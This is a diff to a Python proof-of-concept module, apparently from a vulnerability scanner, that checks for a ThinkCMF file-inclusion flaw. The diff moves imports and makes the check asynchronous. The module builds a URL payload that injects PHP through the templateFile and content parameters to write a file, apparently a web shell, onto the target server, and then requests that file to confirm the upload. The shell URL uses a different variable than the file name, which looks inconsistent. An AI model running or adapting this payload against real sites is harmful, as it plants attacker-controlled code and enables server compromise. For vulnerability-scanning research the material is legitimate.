@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
 import json
-from app.lib.utils.request import request
-from app.lib.utils.encode import urlencode
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.encode import urlencode
+from app.lib.common import get_capta, get_useragent
 
 class Thinkcmf_File_Include_BaseVerify:
     def __init__(self, url):
@@ -28,7 +28,7 @@ class Thinkcmf_File_Include_BaseVerify:
             php_data = reader.read()
         self.php_payload = '''/index.php?a=fetch&templateFile=public/inde&prefix=%27%27&content=<php>file_put_contents('{shellname}.php','{shellcontent}')</php>'''.format(shellname = self.capta, shellcontent = urlencode(php_data, encode_type = 'total'))
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -39,20 +39,15 @@ class Thinkcmf_File_Include_BaseVerify:
         """
 
         try:
-            upload_req = request.get(self.url + self.php_payload, headers = self.headers)
+            upload_req = await request.get(self.url + self.php_payload, headers = self.headers)
             response_str = json.dumps(upload_req.headers.__dict__['_store'])
-            if upload_req.status_code == 200 and 'PHP' in response_str:
+            if upload_req.status == 200 and 'PHP' in response_str:
                 shell_url = self.url + '/%s.php' %(self.data)
-                check_req = request.get(shell_url, headers = self.headers)
-                if check_req.status_code == 200:
+                check_req = await request.get(shell_url, headers = self.headers)
+                if check_req.status == 200:
                     return True
-                else:
-                    return False
-            else:
-                return False
         except Exception as e:
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
